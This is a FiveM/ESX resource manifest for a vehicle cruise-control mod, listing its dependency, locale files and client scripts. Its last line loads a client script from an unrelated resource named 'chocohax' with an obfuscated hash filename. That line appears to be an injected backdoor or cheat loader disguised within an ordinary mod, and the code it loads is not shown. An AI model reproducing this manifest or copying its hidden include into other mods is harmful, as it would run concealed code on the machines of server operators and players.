description 'CruiseControl System for ESX'

version '1.0.0'

dependencies {
  'es_extended'
}

client_scripts {
  '@es_extended/locale.lua',
  'locales/fi.lua',
  'locales/fr.lua',
  'locales/en.lua',
  'locales/ge.lua',
  'client/main.lua',
  'config.lua',
}

client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'